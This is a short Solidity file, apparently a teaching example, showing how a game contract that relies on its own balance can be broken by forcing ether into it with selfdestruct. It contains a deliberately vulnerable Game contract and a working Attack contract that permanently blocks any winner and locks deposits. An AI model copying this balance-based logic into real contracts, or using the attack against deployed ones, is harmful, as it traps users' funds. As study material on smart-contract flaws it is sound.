// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// You can forcefully send a contract Ether 
// even if they do not have an receive or a fallback function

contract Game{

    uint256 targetAmount = 7 ether;
    address public winner;

    function deposit() external payable {
        require(msg.value >= 1 ether, "Send more ether");

        uint256 balance = address(this).balance;

        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claim() external payable {

        require(msg.sender == winner, "You are not a winner");

        (bool sent, ) = winner.call{value : address(this).balance }("");
        require(sent, "Transaction failed");
    }
}

contract Attack {

    function attack(address payable target) external payable {
        selfdestruct(target);
    }
}

// Here we are killing the game by forcefully sending them ether using selfdestruct
// and hence the balance becomes greater than 7 ether and the nobody can become winner